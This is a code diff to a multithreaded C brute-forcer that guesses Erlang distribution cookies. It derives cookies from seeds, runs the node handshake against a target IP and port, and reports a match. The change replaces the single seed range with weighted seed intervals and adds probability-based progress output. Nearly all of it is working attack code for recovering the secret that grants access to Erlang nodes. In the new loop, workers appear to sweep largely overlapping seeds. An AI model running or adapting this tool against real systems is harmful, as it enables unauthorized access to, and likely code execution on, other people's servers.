@@ -11,15 +11,54 @@
 #include <inttypes.h>
 #include <sys/errno.h>
 #include <signal.h>
+#include <sys/queue.h>
 #include <assert.h>
 
 #include "erldp.h"
 
 static const char *target;
 static int port;
-static uint64_t seed_start = 0ULL;
-static uint64_t seed_end = (1UL<<36);
 static unsigned int interconnection_gap = 0UL;
+
+struct interval {
+  uint64_t start;
+  uint64_t stop;
+  float prob;
+  TAILQ_ENTRY(interval) _next;
+};
+static TAILQ_HEAD(,interval) intervals;
+
+
+static struct interval *parse_interval(char *arg) {
+  struct interval *new_interval;
+  char *comma;
+  uint64_t start, stop;
+  float prob;
+
+  comma = strchr(arg, ',');
+  if (!comma) return NULL;
+  *comma = 0;
+
+  start = strtoul(arg, NULL, 10);
+
+  arg = comma+1;
+  comma = strchr(arg, ',');
+  if (!comma) return NULL;
+  *comma = 0;
+
+  stop = strtoul(arg, NULL, 10);
+
+  arg = comma+1;
+  prob = atof(arg);
+
+  new_interval = malloc(sizeof(*new_interval));
+  assert(new_interval != NULL);
+  new_interval->start = start;
+  new_interval->stop = stop;
+  new_interval->prob = prob;
+
+  return new_interval;
+}
 
 static volatile int quit = 0;
 static volatile int finished = 0;
@@ -27,12 +66,13 @@ static volatile int finished = 0;
 struct worker {
   pthread_t tid;
   int index;
-  uint64_t start;
-  uint64_t end;
+
+  struct interval *current_interval;
 
   volatile uint32_t cumulative_seeds;
   volatile uint32_t cumulative_conns;
   volatile uint32_t cumulative_fails;
+  volatile float cumulative_prob;
 };
 
 static int n_workers = 64;
@@ -141,7 +181,7 @@ static void *worker_run(void *arg) {
   struct worker *w = arg;
   struct sockaddr_in addr;
   int ret;
-  uint64_t seed;
+  uint64_t seed, start, stop;
   int sd;
   uint32_t challenge;
   char cookie[20];
@@ -158,49 +198,55 @@ static void *worker_run(void *arg) {
   addr.sin_addr.s_addr = inet_addr(target);
   addr.sin_port = htons(port);
 
-  for (seed = w->start; seed <= w->end && !quit; seed += 1) {
-    create_cookie(seed, cookie, sizeof(cookie));
+  w->cumulative_prob = 0.0;
 
-    sd = socket(PF_INET, SOCK_STREAM, 0);
-    assert(sd != -1);
+  for (; w->current_interval != NULL; w->current_interval = TAILQ_NEXT(w->current_interval, _next)) {
+    start = w->current_interval->start + w->index;
+    stop = w->current_interval->stop;
 
-    ret = setsockopt(sd, SOL_SOCKET, SO_REUSEPORT, &on, sizeof(on));
-    assert(ret == 0);
+    for (seed = start; seed <= stop && !quit; seed += 1) {
+      create_cookie(seed, cookie, sizeof(cookie));
 
-    ret = connect(sd, (struct sockaddr *) &addr, sizeof(addr));
-    if (ret != 0) {
-      fprintf(stderr, "could not connect to target, '%s'\n", strerror(errno));
-      quit = 1;
-      return NULL;
-    }
+      sd = socket(PF_INET, SOCK_STREAM, 0);
+      assert(sd != -1);
 
-    w->cumulative_conns += 1;
+      ret = setsockopt(sd, SOL_SOCKET, SO_REUSEPORT, &on, sizeof(on));
+      assert(ret == 0);
 
-    ret = write_msg(sd, send_name, 7 + name_length);
-    if (ret != name_length + 7) {
-      fprintf(stderr, "could not send complete send_name\n");
-      quit = 1;
-      return NULL;
-    }
+      ret = connect(sd, (struct sockaddr *) &addr, sizeof(addr));
+      if (ret != 0) {
+        fprintf(stderr, "could not connect to target, '%s'\n", strerror(errno));
+        quit = 1;
+        return NULL;
+      }
 
-    ret = read_msg(sd, buffer, sizeof(buffer));
-    if (ret == 0 || ret == -1) {
-      fprintf(stderr, "could not receive send_status\n");
-      quit = 1;
-      return NULL;
-    }
+      w->cumulative_conns += 1;
 
-    if (ret == 4 && memcmp(buffer, "snok", 4) == 0) {
-      w->cumulative_fails += 1;
-      goto failed_handshake;
-    }
-    else if (ret != 3 || memcmp(buffer, "sok", 3) != 0) {
-      fprintf(stderr, "invalid / unexpected message received, while awaiting send_status\n");
-      printf("received :");
-      hexdump(buffer, ret);
-      quit = 1;
-      return NULL;
-    }
+      ret = write_msg(sd, send_name, 7 + name_length);
+      if (ret != name_length + 7) {
+        fprintf(stderr, "could not send complete send_name\n");
+        quit = 1;
+        return NULL;
+      }
+
+      ret = read_msg(sd, buffer, sizeof(buffer));
+      if (ret == 0 || ret == -1) {
+        fprintf(stderr, "could not receive send_status\n");
+        quit = 1;
+        return NULL;
+      }
+
+      if (ret == 4 && memcmp(buffer, "snok", 4) == 0) {
+        w->cumulative_fails += 1;
+        goto failed_handshake;
+      }
+      else if (ret != 3 || memcmp(buffer, "sok", 3) != 0) {
+        fprintf(stderr, "invalid / unexpected message received, while awaiting send_status\n");
+        printf("received :");
+        hexdump(buffer, ret);
+        quit = 1;
+        return NULL;
+      }
 
 
     ret = read_msg(sd, buffer, sizeof(buffer));
@@ -233,19 +279,22 @@ static void *worker_run(void *arg) {
 
     ret = read_msg(sd, buffer, sizeof(buffer));
     if (ret == 17 && buffer[0] == 'a') {
-      printf("\nfound cookie = %.*s\n", 20, cookie);
-      quit = 1;
-      return NULL;
-    }
+        printf("\nfound cookie = %.*s\n", 20, cookie);
+        quit = 1;
+        return NULL;
+      }
 
 failed_handshake:
-    shutdown(sd, SHUT_RDWR);
-    close(sd);
+      shutdown(sd, SHUT_RDWR);
+      close(sd);
 
 
-    if (interconnection_gap) {
-      usleep(interconnection_gap);
+      if (interconnection_gap) {
+        usleep(interconnection_gap);
+      }
     }
+
+    w->cumulative_prob += w->current_interval->prob;
   }
 
   finished += 1;
@@ -257,11 +306,10 @@ failed_handshake:
 
 
 static void usage(const char *arg0) {
-  fprintf(stderr, "usage: %s [--threads=<1-1024>] [--seed-start=<min seed, inclusive>] [--seed-end=<max seed, inclusive>] [--gap=<gap to sleep between each handshake for a thread, in microsec>] <target IPv4> <target port>\n", arg0);
+  fprintf(stderr, "usage: %s [--threads=<1-1024>] [--gap=<gap to sleep between each handshake for a thread, in microsec>] [--interval=<start>,<stop>,<prob> ...] <target IPv4> <target port>\n", arg0);
   fprintf(stderr, "  --threads=<1-1024>: defaults to 64\n");
-  fprintf(stderr, "  --seed-start=<min seed, inclusive>: min seed from which cookie will be deriveed\n");
-  fprintf(stderr, "  --seed-end=<max seed, inclusive>: max seed from which cookie will be deriveed\n");
   fprintf(stderr, "  --gap=<amount of microsec to sleep between each handshake attempt>: defaults to 0, no gap\n");
+  fprintf(stderr, "  --interval=<start>,<stop>,<prob>. May be used multiple times \n");
   exit(1);
 }
 
@@ -279,19 +327,21 @@ int main(int argc, char **argv) {
   uint32_t cumulative_fails;
   uint32_t last_cumulative_fails = 0;
   uint32_t delta_fails;
-  uint64_t seed_delta;
+  struct interval *new_interval;
+  float cumulative_prob;
+
+  TAILQ_INIT(&intervals);
 
   static struct option options[] = {
     {"gap", required_argument, 0, 'g'},
     {"help", 0, 0, 'h'},
     {"threads", required_argument, 0, 't'},
-    {"seed-start", required_argument, 0, 's'},
-    {"seed-end", required_argument, 0, 'S'},
+    {"interval", required_argument, 0, 'i'},
     {NULL, 0, 0, 0},
   };
 
   while (1) {
-    c = getopt_long(argc, argv, "ht:s:S:", options, &option_index);
+    c = getopt_long(argc, argv, "ht:g:i:", options, &option_index);
     if (c == -1) {
       break;
     }
@@ -305,12 +355,15 @@ int main(int argc, char **argv) {
     case 't':
       n_workers = atoi(optarg);
       break;
-    case 's':
-      seed_start = strtoull(optarg, NULL, 10);
-      break;
-    case 'S':
-      seed_end = strtoull(optarg, NULL, 10);
-      break;
+    case 'i':
+      new_interval = parse_interval(optarg);
+      if (new_interval) {
+        TAILQ_INSERT_HEAD(&intervals, new_interval, _next);
+      }
+      else {
+        usage(argv[0]);
+      }
+      break; 
     }
   }
 
@@ -323,11 +376,6 @@ int main(int argc, char **argv) {
     exit(1);
   }
 
-  if (seed_start > seed_end) {
-    fprintf(stderr, "please provide a valid seed range: %" PRIu64 " > %" PRIu64 "\n", seed_start, seed_end);
-    exit(1);
-  }
-
 
   target = argv[optind];
   port = atoi(argv[optind+1]);
@@ -336,19 +384,9 @@ int main(int argc, char **argv) {
   assert(workers != NULL);
 
 
-
-  seed_delta = seed_end - seed_start;
-  seed_delta /= n_workers;
-  seed_delta += 1;
-
-
-  printf("%u workers will start, sweeping through [%" PRIu64 ", %" PRIu64 "]\n", n_workers, seed_start, seed_end);
-  printf("each worker will sweep though an interval of size %" PRIu64 "\n", seed_delta);
-
   for (i = 0; i < n_workers; i++) {
-    workers[i].start = seed_start + i*seed_delta;
-    workers[i].end = seed_start + (i+1)*seed_delta;
     workers[i].index = i;
+    workers[i].current_interval = TAILQ_FIRST(&intervals);
     workers[i].cumulative_conns = 0;
     workers[i].cumulative_seeds = 0;
     workers[i].cumulative_fails = 0;
@@ -356,6 +394,9 @@ int main(int argc, char **argv) {
     ret = pthread_create(&workers[i].tid, NULL, worker_run, &workers[i]);
     assert(ret == 0);
   }
+
+
+
 
   while (!quit) {
     sleep(1);
@@ -384,7 +425,13 @@ int main(int argc, char **argv) {
     delta_fails = cumulative_fails - last_cumulative_fails;
     last_cumulative_fails = cumulative_fails;
 
-    printf("\r %u seed/s (%u conn/s, %u fails/s)\t\t%2.2f%%", delta_seeds, delta_conns, delta_fails, (last_cumulative_seeds*100.0)/(seed_end - seed_start));
+    cumulative_prob = 0.0;
+    for (i = 0; i < n_workers; i++) {
+      cumulative_prob += workers[i].cumulative_prob;
+    }
+    cumulative_prob /= n_workers;
+
+    printf("\r %u seed/s (%u conn/s, %u fails/s)\t\t%2.4f%%", delta_seeds, delta_conns, delta_fails, 100.0*cumulative_prob);
     fflush(stdout);
   }
 
